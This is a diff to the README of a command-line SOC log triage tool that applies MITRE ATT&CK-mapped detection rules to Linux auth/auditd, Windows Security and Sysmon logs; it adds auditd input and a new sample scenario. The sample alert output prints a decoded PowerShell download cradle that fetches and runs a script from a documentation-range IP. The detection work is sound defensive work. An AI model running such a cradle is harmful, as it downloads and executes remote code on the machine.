@@ -1,6 +1,6 @@
 # soc-log-triage
 
-A command line tool for first-pass SOC triage. It reads Linux `auth.log` and Windows Security event exports, normalizes them, runs detection rules mapped to **MITRE ATT&CK**, and produces alerts as terminal output, JSON (for a SIEM or SOAR pipeline) or a Markdown incident triage report.
+A command line tool for first-pass SOC triage. It reads Linux `auth.log` and `auditd` logs, Windows Security events and Sysmon exports, normalizes them, runs detection rules mapped to **MITRE ATT&CK**, and produces alerts as terminal output, JSON (for a SIEM or SOAR pipeline) or a Markdown incident triage report.
 
 No dependencies beyond the Python 3.10+ standard library.
 
@@ -27,7 +27,7 @@ Logic, tuning, false positives and known gaps for each rule are in [docs/DETECTI
 ```bash
 git clone https://github.com/1ungaka/soc-log-triage.git
 cd soc-log-triage
-python -m soc_triage scan sample_logs/auth.log sample_logs/windows_security.jsonl --year 2026
+python -m soc_triage scan sample_logs/* --year 2026
 ```
 
 ```
@@ -41,7 +41,7 @@ python -m soc_triage scan sample_logs/auth.log sample_logs/windows_security.json
     what : PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.
     decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
 ...
-Summary: 3 critical, 3 high, 4 medium
+Summary: 5 critical, 7 high, 8 medium
 ```
 
 See the full Markdown report it produces: [docs/example_report.md](docs/example_report.md).
@@ -69,6 +69,7 @@ Or install it to get a `soc-triage` command: `pip install -e .[dev]`.
 ### Input formats
 
 - **Linux:** `auth.log` / `secure` with classic syslog (`Nov 10 02:13:04`, treated as UTC; set the year with `--year`) or ISO-8601 timestamps.
+- **Linux auditd:** `/var/log/audit/audit.log` records `USER_AUTH`, `USER_LOGIN`, `ADD_USER` and `USER_MGMT` (group changes), with the optional `node=` host prefix, hex-encoded account names and the enriched log format. A failed SSH login writes two records; it is counted once.
 - **Sysmon:** events 1 (process create), 3 (network connection) and 11 (file create) as JSON lines or a JSON array, with Sysmon's own field names (`Image`, `ParentImage`, `CommandLine`, `DestinationIp`, `TargetFilename`, `UtcTime`, ...). Recognised by `Channel` or by the presence of `Image`, so they can be mixed with Security events in one file.
 - **Windows:** Security events as JSON lines or a JSON array with fields such as `EventID`, `TimeCreated`, `Computer`, `TargetUserName`, `SubjectUserName`, `IpAddress`, `CommandLine`. Event IDs used: 1102, 4624, 4625, 4688, 4720, 4728, 4732, 4756. An export like this works:
 
@@ -87,7 +88,8 @@ Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4688,4720,4732,
 2. A password spray against ten usernames.
 3. A Word document on a finance workstation launching a hidden, encoded PowerShell download cradle.
 4. An RDP brute force against a jump host, a new local admin, then the Security log cleared.
-5. The same finance workstation seen through Sysmon (`sysmon.jsonl`): Word drops a `.vbs`, launches PowerShell, PowerShell calls out to the internet and writes `update.exe`.
+5. A second server, `web02`, logging through auditd (`audit.log`): brute force that lands, then a `systemd-sync` account added to `wheel`.
+6. The same finance workstation seen through Sysmon (`sysmon.jsonl`): Word drops a `.vbs`, launches PowerShell, PowerShell calls out to the internet and writes `update.exe`.
 
 It also includes benign activity that must **not** alert: a user mistyping their password, `-ExecutionPolicy Bypass` scripts, and a non-privileged group change. All IPs come from the RFC 5737 documentation ranges.
 
